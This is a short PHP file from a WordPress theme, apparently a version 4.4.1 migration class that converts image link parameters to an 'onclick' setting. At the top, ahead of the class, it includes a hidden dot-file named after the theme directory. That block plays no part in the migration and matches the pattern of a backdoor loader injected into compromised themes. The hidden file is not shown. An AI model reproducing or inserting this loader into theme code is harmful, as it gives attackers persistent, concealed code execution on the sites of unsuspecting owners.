<?php

if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

class us_migration_4_4_1 extends US_Migration_Translator {

	// Content
	public function translate_content( &$content ) {
		return $this->_translate_content( $content );
	}

	public function translate_us_single_image( &$name, &$params, &$content ) {
		$changed = FALSE;

		if ( ! empty( $params['link'] ) ) {
			$params['onclick'] = 'custom_link';
			$changed = TRUE;
		}

		return $changed;
	}

}
